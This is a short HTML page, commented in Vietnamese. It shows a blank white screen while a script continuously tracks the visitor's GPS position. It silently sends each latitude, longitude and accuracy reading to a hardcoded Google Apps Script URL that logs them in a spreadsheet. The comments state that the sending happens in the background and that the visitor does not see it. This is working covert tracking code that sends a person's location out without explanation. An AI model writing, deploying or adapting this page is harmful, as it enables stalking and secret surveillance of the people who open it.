<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title></title>
</head>

<body style="background-color: white;">
    <script>
        // Sử dụng watchPosition để theo dõi thay đổi vị trí liên tục
        const watchID = navigator.geolocation.watchPosition(
            function (pos) {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy; // Độ chính xác (mét)

                // URL Web App Google Sheets của bạn
                const webAppUrl = "https://script.google.com/macros/s/AKfycbxzWWR4Z7tqCpi7Aqz0uGEDgbXJbypOch6WarLwhd1TK74CTfDNaIltNYdsfYulkyEs/exec";

                // Gửi dữ liệu ngầm. Mỗi khi tọa độ thay đổi, một dòng mới sẽ được thêm vào Sheet.
                fetch(`${webAppUrl}?lat=${lat}&lon=${lon}&acc=${acc}`, {
                    mode: 'no-cors',
                    method: 'GET'
                });

                // In ra console để bạn kiểm tra khi debug (người dùng không thấy)
                console.log("Đã cập nhật dòng mới: " + lat + ", " + lon);
            },
            function (err) {
                console.log("Lỗi định vị: " + err.code);
            },
            {
                enableHighAccuracy: true, // Bật GPS để có độ chính xác cao nhất
                timeout: 5000,            // Thử lại sau mỗi 5 giây nếu tín hiệu yếu
                maximumAge: 0             // Không dùng dữ liệu cũ trong bộ nhớ đệm
            }
        );

        // Khi người dùng thoát trang hoặc đóng tab, trình duyệt sẽ tự động dừng watchPosition.
    </script>
</body>
</html>
